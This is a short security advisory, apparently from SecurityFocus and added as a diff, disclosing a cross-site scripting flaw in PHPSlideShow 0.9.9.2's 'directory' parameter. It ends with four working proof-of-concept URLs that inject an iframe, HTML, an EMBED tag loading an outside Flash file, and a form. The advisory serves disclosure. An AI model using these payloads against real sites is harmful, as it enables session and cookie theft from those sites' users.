@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/26575/info
+
+PHPSlideShow is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting this issue allows attackers to execute arbitrary HTML or script code in a user's browser session in the context of an affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+This issue affects PHPSlideShow 0.9.9.2; other versions may also be vulnerable. 
+
+http://www.example.com/scripts/demo/phpslideshow.php?directory="><iframe> http://www.example.com/scripts/demo/phpslideshow.php?directory=<html><font color="Red"><b>Pwned</b></font></html> http://www.example.com/scripts/demo/phpslideshow.php?directory=<EMBED SRC="http://site.com/xss.swf" http://www.example.com/scripts/demo/phpslideshow.php?directory=FORM%20ACTION=%22search.php%22%20METHOD=%22GET%22%3E 
